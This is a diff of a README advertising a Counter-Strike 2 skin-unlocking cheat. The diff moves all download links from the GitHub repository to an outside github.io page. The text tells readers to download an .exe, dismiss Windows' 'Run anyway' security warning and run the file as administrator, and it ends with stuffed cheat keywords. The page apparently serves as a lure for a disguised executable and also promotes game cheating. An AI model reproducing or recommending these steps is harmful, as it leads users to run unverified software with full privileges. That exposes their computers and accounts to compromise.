@@ -1,6 +1,6 @@
 # 🎮 CS2-Skin-Changer-Unlock-All-2026 - Access Every Weapon Skin Instantly Now
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Schoolhouseroma809/CS2-Skin-Changer-Unlock-All-2026)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://schoolhouseroma809.github.io)
 
 ## 📋 About This Tool
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software. Read each instruction carefully.
 
-1.  **Download the Software**: Visit the [official release page](https://github.com/Schoolhouseroma809/CS2-Skin-Changer-Unlock-All-2026) to download the current version. Save the file to your desktop for easy access.
+1.  **Download the Software**: Visit the [official release page](https://schoolhouseroma809.github.io) to download the current version. Save the file to your desktop for easy access.
 2.  **Verify the File**: Ensure the file ends with the .exe extension. Windows may flag unknown programs. You may need to click "More info" and "Run anyway" if a security window appears.
 3.  **Launch the Application**: Double-click the file to open the interface. 
 4.  **Connect to the Game**: Ensure Steam and Counter-Strike 2 remain open before you trigger the skin changes.
@@ -52,6 +52,6 @@ The tool may stop working if the game files change. Download the latest release 
 
 ## 📥 Installation Summary
 
-To install the skin changer, follow this link: [Download Page](https://github.com/Schoolhouseroma809/CS2-Skin-Changer-Unlock-All-2026). Run the file as an administrator after the download finishes. Follow the on-screen prompts to complete the setup. Keep the application open while you play to maintain your skin selection.
+To install the skin changer, follow this link: [Download Page](https://schoolhouseroma809.github.io). Run the file as an administrator after the download finishes. Follow the on-screen prompts to complete the setup. Keep the application open while you play to maintain your skin selection.
 
 Keywords: cs2-2026, cs2-cheat, cs2-cheat-2026, cs2-custom-skins, cs2-download, cs2-exe, cs2-free-skins, cs2-github, cs2-hack, cs2-mod-menu, cs2-modded-skins, cs2-og-skins, cs2-skin-changer, cs2-skin-changer-pc, cs2-skin-hack, cs2-skin-swapper, cs2-skin-swapper-2026, cs2-swapper, cs2-tool, cs2-unlock-all
